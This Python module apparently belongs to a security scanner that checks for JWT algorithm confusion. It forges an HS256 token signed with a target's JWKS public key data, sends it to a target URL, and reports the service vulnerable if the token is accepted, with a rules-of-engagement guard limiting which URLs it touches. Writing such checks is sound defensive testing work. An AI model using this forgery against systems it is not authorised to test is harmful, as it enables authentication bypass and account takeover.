"""RS256 -> HS256 algorithm confusion using JWKS public key as HMAC secret."""
import json, base64, hmac, hashlib
from .. import http as _http
from ..roe_guard import ROEGuard

def _b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")

def scan(jwks_url, target_url, original_token, roe_guard=None):
    if roe_guard is None: roe_guard = ROEGuard()
    roe_guard.check_url(jwks_url, "GET")
    roe_guard.check_url(target_url, "GET")

    with _http.Client(timeout=8, follow_redirects=False) as c:
        r = c.get(jwks_url)
        if r.status_code != 200: return {"verdict": "UNKNOWN", "reason": "JWKS fetch failed"}
        jwks = r.json()

    keys = jwks.get("keys", [])
    if not keys: return {"verdict": "PASS", "reason": "No keys in JWKS"}

    # Extract first RSA key and use its raw JSON representation as HMAC secret
    key_json = json.dumps(keys[0], sort_keys=True).encode("utf-8")

    # Decode original payload
    parts = original_token.split(".")
    if len(parts) != 3: return {"verdict": "UNKNOWN", "reason": "Invalid JWT"}
    payload_b64 = parts[1] + "=" * (-len(parts[1]) % 4)
    payload = json.loads(base64.urlsafe_b64decode(payload_b64))

    # Forge HS256 token
    header = {"alg": "HS256", "typ": "JWT", "kid": keys[0].get("kid")}
    h_b64 = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p_b64 = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h_b64}.{p_b64}".encode("ascii")
    sig = hmac.new(key_json, signing_input, hashlib.sha256).digest()
    forged = f"{h_b64}.{p_b64}.{_b64url_encode(sig)}"

    with _http.Client(timeout=8, follow_redirects=False) as c:
        r = c.get(target_url, headers={"Authorization": f"Bearer {forged}"})

    if r.status_code == 200:
        return {"verdict": "VULNERABLE", "reason": "HS256 accepted with JWKS key as secret",
                "evidence": {"kid": keys[0].get("kid")}}
    return {"verdict": "PASS", "reason": "Algorithm confusion rejected"}
